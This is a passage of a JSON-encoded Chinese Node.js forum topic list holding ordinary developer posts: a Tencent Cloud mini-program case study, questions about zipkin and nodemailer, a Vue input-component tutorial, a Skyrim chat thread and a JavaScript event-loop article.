atabase的能力。</p>\n<p>这么一对比，相信很多小伙伴对nodejs更加了解了，原来前端和服务端的js如此相似，他们的基础是相同的，只是环境不同，导致他们扩展出来的东西不同而已。</p>\n<p>文档来源\n<a href=\"https://segmentfault.com/a/1190000006154835\">https://segmentfault.com/a/1190000006154835</a></p>\n</div>","title":"谈谈前端Javascript与Nodejs的异同","last_reply_at":"2018-12-20T01:10:48.221Z","good":false,"top":false,"reply_count":3,"visit_count":677,"create_at":"2018-12-19T10:33:35.175Z","author":{"loginname":"alber1986","avatar_url":"https://avatars2.githubusercontent.com/u/38983466?v=4&s=120"}},{"id":"5c1a27833898674067a76188","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>2018年12月，腾讯相册累计用户量突破<code>1亿</code>，月活1200万，阿拉丁指数排行 <code>Top 30</code>，已经成为小程序生态的重量级玩家。</p>\n<p>三个多月来，腾讯相册围绕【在微信分享相册照片】这一核心场景，快速优化和新增一系列社交化功能，配合适当的运营，实现累计用户量突破<code>1亿</code>，大大超过预期。</p>\n<p>可是，谁曾想到，这样一个亿级体量的小程序，竟然是一个开发做出来的？他又是有哪般“绝技”，可以一个人撑起一个用户过亿的小程序？</p>\n<h2>后台人力紧缺，怎么办？</h2>\n<p>当我第一次见到腾讯相册小程序的开发David（化名）时，他显得忧心忡忡。</p>\n<p>“年底的目标是要过千万的用户，但现在只有几位前端和后台开发。不仅如此，我们的后台开发还不是百分百能够投入到这个项目，大部分时间要抽身支援其它项目，人力非常紧缺。此外，原有后台系统有不少历史包袱，在原有架构上做新的社交化功能开发是不现实的。怎么办？</p>\n<p>“要不试试’小程序·云开发’吧，只需要前端就可以把小程序搞起，正好解决我们缺后台的难题。”</p>\n<p>于是，David作为腾讯相册前端开发团队的骨干，担当起用小程序·云开发实现腾讯相册小程序社交化功能的重任。</p>\n<p>“第一次接触到’小程序·云开发‘时，觉得这个东西（小程序·云开发）理念挺新颖的———小程序无服务开发模式。在一般的小程序开发中，有三大功能小程序开无法绕开后台的帮助，它门分别是<strong>数据读取</strong>、<strong>文件管理</strong>以及<strong>敏感逻辑的处理（如权限）</strong>。因此，传统的开发模式，在小程序端都必须发送请求到后台进行鉴权，并且处理相关的文件或者数据。即使使用 Node 来搭建后端服务，也需要耗费不少的搭基础架构、后期运维的工作量。”</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/l13hi6bb32.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>“而小程序·云开发则释放了小程序开发者的手脚，赋予了开发者安全、稳定读取数据、上传文件和控制权限的能力，其它的负载、容灾、监控等，我们小程序开发者只需要关注业务逻辑，专注写好业务逻辑即可，其他的事情完全可以不用操心了！本来我还一筹莫展，了解完’小程序·云开发‘的产品原理以后，我瞬间心里有谱了。”</p>\n<h2>二维码扫不出来了</h2>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/mtcolmtuj4.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>道路总是不平坦的 ，在腾讯相册小程序通往用户破亿的道路上，困难重重。</p>\n<p>由于腾讯相册的二维码需要带上的信息量过大，因此它的二维码显得密密麻麻。这种密集的二维码在某些Android机型下，容易出现无法识别小程序的问题。</p>\n<p>这严重制约了腾讯相册小程序分享获客的能力。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/vgihger53p.png?imageView2/2/w/1620\" alt=\"img\">(需要存储name, ownerid, page等大量信息)</p>\n<p>这个事情的解决并不难，只需后台开发把数据先存储到数据库中，然后把数据id放到分享链接上，这样，链接便可以转化成32个字符的短链接，让二维码看起来没有那么密集了。</p>\n<p>但由于后台人力不足，于是前端开发David利用小程序· 云开发的数据库存储能力，通过调用<em>db.collection(‘qr’).add</em>接口，快速实现数据在数据库中的存储。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/41jehjwc0n.png?imageView2/2/w/1620\" alt=\"img\">(云开发数据库，格式类似MongoDB)</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/2162h1bcvv.png?imageView2/2/w/1620\" alt=\"img\">(云开发数据库索引，可加快数据读取)</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/hx5tzvrkca.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>此外，腾讯相册还借住小程序·云开发的云函数能力，生成辨识度更高的小程序码（<a href=\"https://developers.weixin.qq.com/miniprogram/dev/api/qrcode.html\">小程序码文档</a>），用以在朋友圈里传播分享。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/fgfjp2nw48.png?imageView2/2/w/1620\" alt=\"img\">(生成小程序码的云函数逻辑)</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/0ul3mjha12.jpg?imageView2/2/w/1620\" alt=\"img\">(优化后的分享图片和小程序码)</p>\n<h2>2天上线评论点赞功能</h2>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/n613q0d9v8.png?imageView2/2/w/1620\" alt=\"img\">(评论与点赞功能)</p>\n<p>腾讯相册在微信端的核心应用场景是“在微信做分享相册照片”，为了增强腾讯相册用户在微信里的互动，提升用户粘性和留存，腾讯相册决定新增评论与点赞功能，并且把聊天评论就直接在微信聊天窗口里面实现。</p>\n<p>在这里，腾讯相册的David面临了两个选择，一是按原开发模式（前台开发-后台开发-前后台联调）做这个功能，面临的问题便是开发周期长、缺后台、迭代速度慢；另一个就是借助云开发的能力，撸起袖子自己上。</p>\n<p>为了加快产品迭代速度，David决定采取云开发的开发方式。评论、点赞通过云开发的数据库插入和查询接口，如<em>db.collection(‘comment’).add</em>，很快就实现了。</p>\n<p>但遇到棘手的问题是，对于一些敏感的操作比如删除和编辑评论、点赞这些敏感操作，还需要到用户的鉴权操作，而这些鉴权信息，都在原有的后台。此时，<strong>云函数的路由</strong>功能便发挥出作用了。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1011618/4jaqb3t35h.png?imageView2/2/w/1620\" alt=\"img\">(评论点赞逻辑)</p>\n<p>用户进行评论点赞的时候，会在小程序端发起请求调用云函数并带上 <code>openid</code>，云函数用 <code>openid</code> 查询原有的后台服务看看该用户是否有权限进行操作，如果用户具有权限，则把评论和点赞的数据都写入云开发的数据库中。</p>\n<p>就这样，借住小程序·云开发的能力，腾讯相册仅用2天时间，完成了在传统开发模式下需要1周多工作量的开发工作。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>原有开发模式</th>\n<th>云开发全栈开发</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>工作量</td>\n<td>后台1周(微信登录态校验+业务逻辑server开发)+ 前后台联调1天</td>\n<td>1 - 2天，无需联调</td>\n</tr>\n</tbody>\n</table>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"1个开发如何撑起一个过亿用户的小程序","last_reply_at":"2018-12-20T01:04:49.170Z","good":false,"top":false,"reply_count":2,"visit_count":785,"create_at":"2018-12-19T11:12:03.004Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c177aef7ec239239ff57abf","author_id":"573212537abbbd520cb244b3","tab":"ask","content":"<div class=\"markdown-text\"><p>我们想用 zipkin 收集日志. 自己捕获的错误日志怎么放<code>tags</code>里呢?</p>\n<pre class=\"prettyprint language-js\"><code>{\n  traceId: &#x27;288e09f4ccc83e536ce7097bb47a470f&#x27;,\n  id: &#x27;6ce7097bb47a470f&#x27;,\n  name: &#x27;get&#x27;,\n  kind: &#x27;SERVER&#x27;,\n  timestamp: 1545042239963000,\n  duration: 45140,\n  localEndpoint:\n   Endpoint {\n     serviceName: &#x27;node_front_test&#x27;,\n     ipv4: &#x27;&#x27;,\n     port: undefined },\n  remoteEndpoint: undefined,\n  annotations: [],\n  tags: { &#x27;http.path&#x27;: &#x27;&#x2F;test&#x27;, &#x27;http.status_code&#x27;: &#x27;200&#x27; },\n  debug: false,\n  shared: false\n}\n</code></pre></div>","title":"有大佬用过 zipkin 么?","last_reply_at":"2018-12-19T11:18:19.735Z","good":false,"top":false,"reply_count":1,"visit_count":603,"create_at":"2018-12-17T10:31:11.601Z","author":{"loginname":"dlyt","avatar_url":"https://avatars0.githubusercontent.com/u/18431616?v=4&s=120"}},{"id":"5c19ba4a76c4964062a1b29b","author_id":"580c1addc3fead57507172a9","tab":"ask","content":"<div class=\"markdown-text\"><p>我想使用nodemailer发送邮件 这样配置：</p>\n<pre class=\"prettyprint\"><code>let transporter = nodemailer.createTransport({\n  service: &#x27;smtp.exmail.qq.com&#x27;,\n  port: 465,\n  secureConnection: true,\n  auth: {\n    user: &#x27;xxx@qq.com&#x27;,\n    pass: &#x27;xxx&#x27;\n  }\n})\nlet mailOptions = {\n  from: &#x27;xxx@qq.com&#x27;,\n  to: &#x27;x@qq.com&#x27;,\n  subject: &#x27;....&#x27;\n}\ntransporter.sendMail(mailOptions, (err, info) =&gt; {\n    if (err) {\n      console.log(&#x27;err&#x27;, err)\n    }\n  })\n</code></pre><p>报错如下：</p>\n<pre class=\"prettyprint\"><code>err { Error: connect ECONNREFUSED 127.0.0.1:465\n  at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1161:14)\nerrno: &#x27;ECONNREFUSED&#x27;,\ncode: &#x27;ECONNECTION&#x27;,\nsyscall: &#x27;connect&#x27;,\naddress: &#x27;127.0.0.1&#x27;,\nport: 465,\ncommand: &#x27;CONN&#x27; }\n</code></pre><p>为什么服务器会指向 127.0.0.1:465呢？是配置的不对吗？求解答</p>\n</div>","title":"如何从node发送qq邮件","last_reply_at":"2018-12-19T10:49:15.347Z","good":false,"top":false,"reply_count":8,"visit_count":768,"create_at":"2018-12-19T03:26:02.004Z","author":{"loginname":"jowang2016","avatar_url":"https://avatars1.githubusercontent.com/u/18169317?v=4&s=120"}},{"id":"55b058330500ae450bcc3770","author_id":"54af591fce87bace2444cdaf","tab":"ask","content":"<div class=\"markdown-text\"><p>本来项目好好的，做完项目快1个星期没去动。今天运行项目，发现大部分页面在浏览器上全部以源码形式显示，这是什么情况？\n我任何代码都还没有进行修改。</p>\n<p>有2个页面仍然可以显示。我将路由部分其中一个函数的代码放到显示正确页面对应的路由上，出现页面显示的是源码，而不是浏览器解析后的页面。但是我将代码还原回去，页面也变成了源码。</p>\n<p>F12查看后，可以发现本来页面的代码外层又套了一层&lt;html&gt;，而且有一个pre标签将原先的页面源码包起来了。</p>\n<p>求大神指导这是什么情况。这不是我源码的问题，源码未改过，无任何修改过的记录。</p>\n</div>","title":"nodejs为什么把页面全部变成了源码在浏览器上显示","last_reply_at":"2018-12-19T05:51:32.537Z","good":false,"top":false,"reply_count":9,"visit_count":4449,"create_at":"2015-07-23T02:57:55.087Z","author":{"loginname":"HypnosNova","avatar_url":"https://avatars.githubusercontent.com/u/7953802?v=3&s=120"}},{"id":"5c19b8e13898674067a75cea","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<h2>1. 需求</h2>\n<p>最近的项目中，需要实现在vue框架中动态渲染带提示框的单选/多选文本框，具体的效果如下图所示，在输入框聚焦时，前端组件通过接收的kv参数渲染出选项，用户点击选项，可以将选择的选项的key拼装到输入框中，同时允许用户自由输入。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1065788/ejdptkippr.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>由于项目中使用的element-ui，首选考虑使用组件的input和select组件，然而实际使用中发现框架提供的组件不能很好满足此需求。例如，使用带输入建议的input组件，能够实现提示框和单选，但并不能方便地实现多选(重复选择会覆盖输入框内的内容)。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1065788/psvk8evzjj.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>而使用框架提供的select选择器的远程搜索功能，能够实现提示框，也能轻松实现单选与多选，但select组件的内容只能通过用户选择(文本框内容必须包含于提示选项中)，不允许用户自由输入文本内容。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1065788/57molhnn0q.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>再加上设计稿需要实现三列布局，最终的返回结果需要动态拼装选项key值，若对现有的element组件进行改造成本过高，因此，尝试封装带提示框的单选/多选文本框组件，记录下封装过程中组件交互方面遇到的问题。</p>\n<h2>2. 接口参数设计</h2>\n<p>组件支持传入6个参数，分别为</p>\n<ol>\n<li>size  (尺寸，String， medium / small / mini)</li>\n<li>value  (输入值，String，可以使用sync修饰符实现双向绑定)</li>\n<li>opt  (选项列表，Array，kv数组形如{key:1, value:xxx})</li>\n<li>seperator  (分隔符，String，如’,’、’|’、’-’)</li>\n<li>multiple  (是否支持多选，Boolean)</li>\n<li>placeholder  (提示，String)</li>\n</ol>\n<p>调用方式如下：</p>\n<pre class=\"prettyprint language-js\"><code>&lt;cs-select\n  size=&quot;mini&quot; &#x2F;&#x2F; 尺寸\n  :value.sync=&quot;value&quot; &#x2F;&#x2F; value\n  :opt=&quot;optParams.kv&quot; &#x2F;&#x2F; 选项 \n  seperator=&quot;,&quot; &#x2F;&#x2F; 分隔符\n  :multiple=&quot;true&quot;&gt;\n&lt;&#x2F;cs-select&gt;\n</code></pre><h2>3. 提示框显示隐藏交互实现</h2>\n<p>细化上述需求，需要在用户点击输入框(获取焦点)时，显示提示框，在用户点击空白区域时隐藏提示框，点击组件自身时不做任何操作。组件的模板结构如下，通过show变量控制提示框的显示与隐藏，在组件的输入框绑定聚焦和失焦事件： <code>@focus=&quot;onfocus&quot;</code> 和 <code>@blur=&quot;onblur&quot;</code>，在focus时设置this.show为true，blur时为false，由于点击了输入框外的选项元素必然导致输入框失焦从而自动关闭，所有问题的关键在于如何实现点击提示选项而不隐藏提示框。</p>\n<pre class=\"prettyprint language-js\"><code>&lt;template&gt;\n  &lt;div&gt;\n  \t&lt;!-- 输入框 --&gt;\n    &lt;el-input\n      @focus=&quot;onfocus\n      @blur=&quot;onblur&gt;\n    &lt;&#x2F;el-input&gt;\n    &lt;!-- 提示框 --&gt;\n    &lt;div v-if=&quot;show &amp;&amp; opt.length &gt; 0&quot;&gt;\n      &lt;el-row&gt;\n        &lt;el-col :span=&quot;8&quot; v-for=&quot;(item, index) in opt&quot; :key=&quot;index&quot;&gt;\n          {{item.value}}\n        &lt;&#x2F;el-col&gt;\n      &lt;&#x2F;el-row&gt;\n    &lt;&#x2F;div&gt;\n  &lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n</code></pre><h3>3.1 尝试方案1: click事件主动聚焦</h3>\n<p>根据上述需求，毫无疑问联想到可以为选项绑定click事件，调用el-input的<code>focus()</code>方法进行主动聚焦，实现如下，此处使用了vue的ref，通过$ref来查找dom元素。</p>\n<pre class=\"prettyprint language-js\"><code>clickEvent () {\n  this.show = true &#x2F;&#x2F; 设置提示框显示\n  this.$refs.input.$el.querySelector(&#x27;input&#x27;).focus() &#x2F;&#x2F; 设置主动聚焦\n}\n</code></pre><p><strong>问题：<strong>实际开发过程中发现，每次点击提示选项后，提示框会闪烁一次，原因在于js的事件机制，<code>blur</code>事件先于<code>click</code>事件执行，导致提示框隐藏后再显示，造成</strong>闪烁</strong>。</p>\n<h3>3.2 尝试方案2: blur事件添加延时器 + 开关变量</h3>\n<p>由于方案1<code>blur</code>事件先于<code>click</code>事件执行，因此考虑使用<code>settimeout</code>延时器来改变执行时间，实现如下。</p>\n<pre class=\"prettyprint language-js\"><code>blurEvent () {\n  setTimeout(() =&gt; {\n    this.show = false\n  }, 200)\n}\n</code></pre><p>**问题：**实际开发过程中发现，延时器延时执行关闭操作，导致输入框获取焦点后，主动关闭了提示框，不再自动打开，不满足需求，因此考虑使用开关变量<code>canClose</code>判断当前是否需要执行关闭，实现如下。</p>\n<pre class=\"prettyprint language-js\"><code>focusEvent () {\n  this.show = true\n  this.canClose = true &#x2F;&#x2F; 聚焦时打开开关\n},\nblurEvent () {\n  if (this.canClose) {\n    setTimeout(() =&gt; {\n      this.show = false &#x2F;&#x2F; 只有开关打开时才执行关闭\n    }, 200)\n  }\n},\nclickEvent (key) {\n  this.canClose = false &#x2F;&#x2F; 点击提示选项，关闭开关\n  this.show = true\n  ...\n}\n</code></pre><p><strong>问题：<strong>实际开发过程中发现，大多数情况下，提示框能够显示与隐藏，但是当操作较快时，会</strong>偶尔出现提示框不能关闭或提前关闭</strong>的情况，分析原因在于，延时器期间任何对开关的操作可能导致组件开关状态变化，致使状态紊乱。</p>\n<h3>3.3 尝试方案3: 不使用blur，关闭方法改为事件委托，动态绑定class</h3>\n<p>如果关闭不使用blur，而是通过点击事件触发，则不会存在上述时序问题，因此考虑在全局使用事件委托，监听用户的点击事件，通过判断节点特殊class实现提示框关闭，实现如下。</p>\n<pre class=\"prettyprint language-js\"><code>$(&#x27;body&#x27;).on(&#x27;click&#x27;, (event) =&gt; {\n  this.show = false\n})\n$(&#x27;body&#x27;).on(&#x27;click&#x27;, className, (event) =&gt; {\n  this.show = true\n})\n</code></pre><p><strong>问题1：<strong>事件委托，使用固定的class，当同时渲染多个组件时，无法实现单独管理提示框的开关，因此</strong>无法渲染多组件</strong>，因此class使用动态绑定，每个组件使用不同的class，实现如下。</p>\n<p>**问题2：**阻止冒泡，如果组件的父容器阻止了冒泡，则无法触发body上绑定的关闭方法，需要针对父容器单独处理。</p>\n<pre class=\"prettyprint language-js\"><code>let randId = Math.round(Math.random()*100000)\nthis.className = &#96;cs-select-${randId}&#96;\n&#x2F;&#x2F; 单独处理父容器，在父容器上绑定关闭事件\n...\n</code></pre><p>改造后的组件表面看起来已经基本可用，实际存在诸多问题：</p>\n<p>**问题1：**组件中对父组件绑定了事件，违反了设计模式的迪米特法则，<strong>增加了组件间的耦合</strong>，不利于后期维护。</p>\n<p>**问题2：**上述操作只考虑了点击事件的关闭，忽略了其他可能关闭的情况，如使用<code>tab</code>按键切换输入框时也需要能正常显示隐藏提示框。</p>\n<p>**问题3：**绑定事件过多会带来性能隐患甚至导致意想不到的问题发生。</p>\n<h3>3.4 尝试方案4: onfocus + onblur + mousedown + 开关</h3>\n<p>由于focus事件先于click事件执行，导致了上述方案1和方案2问题的产生，通过查阅资料可知，<code>mousedown</code>事件先于focus事件执行，因此，使用onfocus + onblur + mousedown + 开关能够很好解决上述执行时序问题，具体实现如下。</p>\n<pre class=\"prettyprint language-js\"><code>focusEvent () {\n  this.show = true\n  this.canClose = true &#x2F;&#x2F; 聚焦时打开开关\n},\nblurEvent () {\n  if (this.canClose) {\n    this.show = false &#x2F;&#x2F; 只有开关打开时才执行关闭\n  }\n},\nmousedownEvent (key) {\n  this.canClose = false &#x2F;&#x2F; 点击提示选项，关闭开关\n  this.show = true\n  this.$refs.input.$el.querySelector(&#x27;input&#x27;).focus()\n  ...\n}\n</code></pre><p>**问题：**实际开发中发现，由于组件是动态渲染的，mousedownEvent事件中无法直接获取到当前对象的dom元素<code>this.$refs.xxx</code>，导致自动聚焦失败。</p>\n<h3>3.5 实现方案</h3>\n<p>在方案4的基础上，使用<code>nextTick</code><strong>异步更新队列</strong>能够解决dom渲染时序问题，具体实现针对方案4稍作修改即可。</p>\n<blockquote>\n<p><code>$nextTick</code>:  在vue官方深入响应式原理中说明了 vue 实现响应式并不是数据发生变化之后 DOM 立即变化，而是在下次 DOM 更新循环结束之后执行延迟回调，在修改数据之后使用 $nextTick，则可以在回调中获取更新后的 DOM，官方示例：<a href=\"https://cn.vuejs.org/v2/guide/reactivity.html#search-query-sidebar\">https://cn.vuejs.org/v2/guide/reactivity.html#search-query-sidebar</a>focusEvent () {   this.show = true   this.canClose = true // 聚焦时打开开关 }, blurEvent () {   if (this.canClose) {     this.show = false // 只有开关打开时才执行关闭   } }, mousedownEvent (key) {   this.canClose = false // 点击提示选项，关闭开关   this.show = true   this.$nextTick(() =&gt; {     this.$refs.input.$el.querySelector(‘input’).focus()   })   … }4. 组件数据双向绑定</p>\n</blockquote>\n<p>为了方便组件内数据的处理，传入组件的输入值value会首先被split分解为key数组，然后添加watcher观察器，监听输入值的变化，更新提示框的选中状态，并通过<code>$emit</code>方法同步到父组件中，实现数据的双向绑定，输入值的watch如下所示：</p>\n<pre class=\"prettyprint language-js\"><code>watch: {\n  inputVal: {\n    handler () {\n      let selectArray = this.inputFilter()\n      this.inputVal = selectArray.join(this.seperator)\n      &#x2F;&#x2F; 更新选中状态\n      this.updateActive()\n      &#x2F;&#x2F; 同步数据\n      this.$emit(&#x27;update:value&#x27;, this.inputVal) &#x2F;&#x2F; 可改为v-model\n    },\n    immediate: true\n  }\n}\n</code></pre><h2>5. 组件应用与改进</h2>\n<p>带提示框的单选/多选文本框组件的应用场景较多，典型的场景如封装企业联系人的选择器，用户输入用户名关键词，提示框显示相关联系人，同时允许用户自由输入用户名。</p>\n<p>组件还有不少可以改进的地方，例如：</p>\n<ol>\n<li>目前的设计通过监听mousedown来阻止提示框的关闭，很明显不能兼容移动端，可以考虑添加touch事件；</li>\n<li>在css布局方面没有判断用户可见的友好性，在极端情况下可能会超出屏幕范围；</li>\n<li>还不支持slot插槽和动态设置class等。</li>\n</ol>\n<p>随着整体项目的迭代可以逐步完善。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"教你一个vue小技巧，一般人我不说的","last_reply_at":"2018-12-19T03:20:01.246Z","good":false,"top":false,"reply_count":0,"visit_count":795,"create_at":"2018-12-19T03:20:01.246Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c1869d97ec239239ff57e0a","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>以前玩 skyrim 的时候，无意间发现一个 youtube 博主叫做 Malukah，翻唱 skyrim 游吟诗人的歌曲，而且自己给自己和音，觉得特别厉害：\n<img src=\"//static.cnodejs.org/FgYBEREV3u-hj8Pll-lBnDdr8mwv\" alt=\"image.png\">\n就是先自己录一个声部，然后再录另一个声部，然后通过剪辑合起来，真的挺用心的。</p>\n<p>然后最近就发现了一个国外 app，就支持这种自己给自己和音！\n<img src=\"//static.cnodejs.org/FrWyFn56cLFpRbXO1097WO-Tk34y\" alt=\"IMG_5271.PNG\"></p>\n<p>感觉这个 app 像个音乐版的 twitter，不过跟 twitter 一样，好像也是需要翻墙才能看，不过这里有一个不用翻墙的介绍：\n<a href=\"https://mergeek.com?project_id=pd1BojmjZlm2KzQq\">WunTwun</a></p>\n<hr>\n<p>嗯，说了这么多，其实就是这个 app 让我想起了 skyrim。\nskyrim 真的很有诚意，是我见过唯一一个居然提供控制台，大家可以随便做 mod 超开放游戏，与其说是游戏，不如说是一个平台。如果国内的科技巨头也有这种度量，做出来的产品肯定不用躲在墙内自己嗨。</p>\n<p>skyrim 里我最喜欢的片段之一是，一个父亲对一个正要远行的儿子说，“Why the sad face? You’ve got the whole world in front of you!”。</p>\n<p>这个游戏激发了我探索世界的欲望。</p>\n<p>希望上古6 还能保持这份诚意，并且在有生之年能够发售：）</p>\n</div>","title":"喜欢上古卷轴的人可以进来聊聊，喜欢音乐的也行~","last_reply_at":"2018-12-19T01:53:18.961Z","good":false,"top":false,"reply_count":5,"visit_count":728,"create_at":"2018-12-18T03:30:33.274Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5c19a1b176c4964062a1b1ad","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017419328\">JavaScript是如何工作的:事件循环和异步编程的崛起+ 5种使用 async/await 更好地编码方式！</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>此篇是 JavaScript是如何工作的第四篇，其它三篇可以看这里：</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000017352941\">JavaScript是如何工作的：引擎，运行时和调用堆栈的概述！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017369465\">JavaScript是如何工作的：深入V8引擎&amp;编写优化代码的5个技巧!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017392370\">JavaScript如何工作:内存管理+如何处理4个常见的内存泄漏!</a></li>\n</ul>\n<p>通过第一篇文章回顾在单线程环境中编程的缺陷以及如何解决这些缺陷来构建健壮的JavaScript UI。按照惯例，在本文的最后，分享5个如何使用async/ wait编写更简洁代码的技巧。</p>\n<h3>为什么单线程是一个限制？</h3>\n<p>在发布的第一篇文章中，思考了这样一个问题：当调用堆栈中有函数调用需要花费大量时间来处理时会发生什么?</p>\n<p>例如，假设在浏览器中运行一个复杂的图像转换算法。</p>\n<p>当调用堆栈有函数要执行时，浏览器不能做任何其他事情——它被阻塞了。这意味着浏览器不能渲染，不能运行任何其他代码，只是卡住了。那么你的应用 UI 界面就卡住了，用户体验也就不那么好了。</p>\n<p>在某些情况下，这可能不是主要的问题。还有一个更大的问题是一旦你的浏览器开始处理调用堆栈中的太多任务，它可能会在很长一段时间内停止响应。这时，很多浏览器会抛出一个错误，提示是否终止页面：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-01.jpeg\" alt></p>\n<h3>JavaScript程序的构建块</h3>\n<p>你可能在单个.js文件中编写 JavaScript 应用程序，但可以肯定的是，你的程序由几个块组成，其中只有一个正在执行，其余的将在稍后执行。最常见的块单元是函数。</p>\n<p>大多数刚接触JavaScript的开发人员似乎都有这样的问题，就是认为所有函数都是同步完成，没有考虑的异步的情况。如下例子：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-02.png\" alt></p>\n<p>你可能知道标准 Ajax 请求不是同步完成的，这说明在代码执行时 <code>Ajax(..)</code> 函数还没有返回任何值来分配给变量 <code>response</code>。</p>\n<p>一种等待异步函数返回的结果简单的方式就是 <strong>回调函数：</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-03.png\" alt></p>\n<p>注意：实际上可以设置同步Ajax请求，但永远不要那样做。如果设置同步Ajax请求，应用程序的界面将被阻塞——用户将无法单击、输入数据、导航或滚动。这将阻止任何用户交互，这是一种可怕的做法。</p>\n<p>以下是同步 Ajax 地，但是请千万不要这样做：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-04.png\" alt></p>\n<p>这里使用Ajax请求作为示例，你可以让任何代码块异步执行。</p>\n<p>这可以通过 setTimeout(callback，milliseconds) 函数来完成。setTimeout 函数的作用是设置一个回调函数milliseconds后执行，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>function first() {\n    console.log(&#x27;first&#x27;);\n}\nfunction second() {\n    console.log(&#x27;second&#x27;);\n}\nfunction third() {\n    console.log(&#x27;third&#x27;);\n}\nfirst();\nsetTimeout(second, 1000); &#x2F;&#x2F; Invoke &#96;second&#96; after 1000ms\nthird();\n</code></pre><p>输出：</p>\n<pre class=\"prettyprint\"><code>first\nthird\nsecond\n</code></pre><h3>解析事件循环</h3>\n<p>这里从一个有点奇怪的声明开始——尽管允许异步 JavaScript 代码(就像上例讨论的setTimeout)，但在ES6之前，JavaScript本身实际上从来没有任何内置异步的概念，JavaScript引擎在任何给定时刻只执行一个块。</p>\n<p>那么，是谁告诉JS引擎执行程序的代码块呢?实际上，JS引擎并不是单独运行的——它是在一个宿主环境中运行的，对于大多数开发人员来说，宿主环境就是典型的web浏览器或Node.js。实际上，现在JavaScript被嵌入到各种各样的设备中，从机器人到灯泡，每个设备代表 JS 引擎的不同类型的托管环境。</p>\n<p>所有环境中的共同点是一个称为<strong>事件循环</strong>的内置机制，它处理程序的多个块在一段时间内通过调用调用<code>JS</code>引擎的执行。</p>\n<p>这意味着JS引擎只是任意JS代码的按需执行环境，是宿主环境处理事件运行及结果。</p>\n<p>例如，当 JavaScript 程序发出 Ajax 请求从服务器获取一些数据时，在函数(“回调”)中设置“response”代码，JS引擎告诉宿主环境:“我现在要推迟执行，但当完成那个网络请求时，会返回一些数据，请回调这个函数并给数据传给它”。</p>\n<p>然后浏览器将侦听来自网络的响应，当监听到网络请求返回内容时，浏览器通过将回调函数插入事件循环来调度要执行的回调函数。以下是示意图：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-05.png\" alt></p>\n<p>这些Web api是什么?从本质上说，它们是无法访问的线程，只能调用它们。它们是浏览器的并发部分。如果你是一个Nojs.js开发者，这些就是 c++ 的 Api。</p>\n<p>这样的迭代在事件循环中称为**(tick)标记**，每个事件只是一个函数回调。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-06.png\" alt></p>\n<p>让我们“执行”这段代码，看看会发生什么:</p>\n<h4>1. 初始化状态都为空，浏览器控制台是空的的，调用堆栈也是空的</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-07.png\" alt></p>\n<h4>2. console.log(‘Hi’)添加到调用堆栈中</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-08.png\" alt></p>\n<h4>3. 执行console.log(‘Hi’)</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-09.png\" alt></p>\n<h4>4. console.log(‘Hi’)从调用堆栈中移除。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-10.png\" alt></p>\n<h4>5. setTimeout(function cb1() { … }) 添加到调用堆栈。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-11.png\" alt></p>\n<h4>6. setTimeout(function cb1() { … }) 执行，浏览器创建一个计时器计时，这个作为Web api的一部分。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-12.png\" alt></p>\n<h4>7. setTimeout(function cb1() { … 